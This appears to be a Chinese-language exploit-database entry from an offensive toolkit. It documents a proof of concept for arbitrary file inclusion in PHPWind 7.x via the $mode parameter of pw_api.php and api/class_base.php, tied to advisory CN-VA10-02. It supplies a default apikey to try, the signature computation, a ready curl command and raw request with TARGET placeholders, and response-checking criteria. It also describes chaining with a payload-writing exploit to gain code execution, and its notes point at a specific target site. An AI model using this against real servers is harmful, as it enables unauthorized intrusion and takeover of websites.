# PHPWind 7.x pw_api.php → api/class_base.php $mode 任意文件包含（CN-VA10-02 点名文件，不依赖 register_globals）

- **code**: phpwind-7.x-pw_api.php-api-class_base.php-mode-任意文件包含-cn-va10-02-点名文件-不依赖-regist
- **kind**: poc
- **category**: rce
- **component**: PHPWind
- **versions**: PHPWind 7.x（CN-VA10-02 通报点名为 7.5.x 的 /api/class_base.php；7.3.2 属同分支且更早，机制同样成立 —— 待实测文件存在性）。8.x 该文件被重写为 S::escapePath 形态
- **language**: bash
- **source**: web
- **source_url**: https://target273.example.com/43/cc/c33375a410572/page.htm
- **verified_note**: 【情报角色零目标请求 —— 本条未在目标上发包验证】。源码级确证：pw75sp3/api/class_base.php L110-117 的 require_once 拼接待过滤 $mode，且 $mode 来自 $request['mode']（$_POST+$_GET）——逐行读出。**关键增量**：该洞不依赖 register_globals（PHP 5.4 起已移除），故在目标 PHP 5.5.38 上机制成立；这与知识库里 7.5 apps/ 那条（依赖 register_globals 而失效）本质不同。**未确证项**：目标 7.3.2 的 pw_api.php 是否存在（任务情报「api 全 404」指 api/ 目录直访，根目录 pw_api.php 需单独确认）。受 file_exists + 强制 .php 后缀限制，无法用 %00 截断，需站上已有可控 .php 配合，故列为备用链。
- **path**: pocs/phpwind-7.x-pw_api.php-api-class_base.php-mode-任意文件包含-cn-va10-02-点名文件-不依赖-regist/pwapi-mode-lfi.sh
- **tags**: phpwind,7.3.2,任意文件包含,LFI,pw_api,class_base,mode,CN-VA10-02,不依赖register_globals
- **created_at**: 2026-10-06T18:11:59.060Z
- **found_by**: exploit

## 描述

pw_api.php 的 $mode 参数未经任何过滤直接拼进 require_once 的路径，构成任意文件包含（对应 CN-VA10-02 通报里点名的 /api/class_base.php）。$mode 来自 $_POST+$_GET，不依赖 register_globals，故在 PHP 5.5.38 上依然成立。受 file_exists + 强制 .php 后缀限制，属"备用链"，需配合一个已落盘的可控 .php 使用。

## 用法

```
1) 前置：/bbs/pw_api.php 返回 200；拿到 apikey（db_siteownerid，先试默认值 43ad6aed9e1523ba169f562221480891，或用 02 脚本盲注）
2) 算 sig：ARG="method=anything&mode=<MODE>&type=app&"；SIG=md5(ARG.apikey)
   （键名 ksort 序：method < mode < type；跳过 sig 与空值）
3) 发请求：
   curl -sk -G 'https://TARGET/bbs/pw_api.php' \
     --data-urlencode "mode=x/../../data/bbscache/info_class" \
     --data-urlencode "method=anything" \
     --data-urlencode "type=app" \
     --data-urlencode "sig=<SIG>"
4) 判据：响应含 "Class(x/../../data/bbscache/info_class) Not Exists" => file_exists 未通过（继续调穿越深度）；
   响应含 "Error Sign" => apikey 错；
   被包含文件若输出内容 => 包含成功
5) 需要替换的参数：TARGET / APIKEY / MODE / SIG
```

## 正文

```
api/class_base.php L110-117（pw75sp3 源码逐行）：
  function callback($mode, $method, $params) {
      if (!isset($this->classdb[$mode])) {
          if (!file_exists(R_P.'api/class_' . $mode . '.php')) {
              return new ErrorMsg(API_MODE_NOT_EXISTS, "Class($mode) Not Exists");
          }
          require_once Pcv(R_P.'api/class_' . $mode . '.php');     // ← $mode 未过滤，直接拼进 require_once
          $this->classdb[$mode] = new $mode($this);
      }
      ...
  }

$mode 的来源（L96）：$mode = $request['mode'];  其中 $request = $_POST + $_GET
  => **不依赖 register_globals**（PHP 5.4+ 已移除 register_globals，此洞仍成立）
  => pw_api.php 未做 InitGP，**不经 Char_cv/CheckVar 清洗**

对应的公开通报：CN-VA10-02 / 复旦信息化办「PHPWind 7.5 存在多个安全漏洞」（2010-01-18）
原文：「PHPWind 7.5.x 版本后台程序多个文件（/api/class_base.php、/apps/share/example.com、
/apps/groups/example.com）中若干变量在默认安装情况下未进行引用过滤或未完成初始化，
攻击者可以远程执行特定构造的包含 php 命令的代码获得网站管理权限」

限制条件（必须说明）：
  1) file_exists 强制 '.php' 后缀 => 不能用 %00 截断（PHP 5.5.38 已无空字节截断）
  2) 必须指向站上**已存在**的 .php 文件
  3) 仍需 apikey 过 sig 校验（class_base.php L93）

路径穿越写法（api/class_<mode>.php）：
  mode = x/../../data/bbscache/info_class
  => R_P.'api/class_x/../../data/bbscache/info_class.php'
  => 规范化后 = R_P.'data/bbscache/info_class.php'   （'class_x' 是普通目录名，两个 '..' 依次回退 api/ 与 bbs/）

完整请求原文：
GET /bbs/pw_api.php?mode=x%2F..%2F..%2Fdata%2Fbbscache%2Finfo_class&method=anything&type=app&sig=<MD5> HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.36 Safari/537.36

sig 计算：ARG = "method=anything&mode=x/../../data/bbscache/info_class&type=app&"
          SIG = md5(ARG . apikey)

与链二的关系：链二（threadscateGory）负责"写入含 payload 的 info_class.php"，
本链负责"包含执行任意已存在的 .php"。两者都用同一个 sig 机制、同一个 pw_api.php 入口，
互为备用；本链单独使用时需要一个内容可控的已落盘 .php 文件。
```
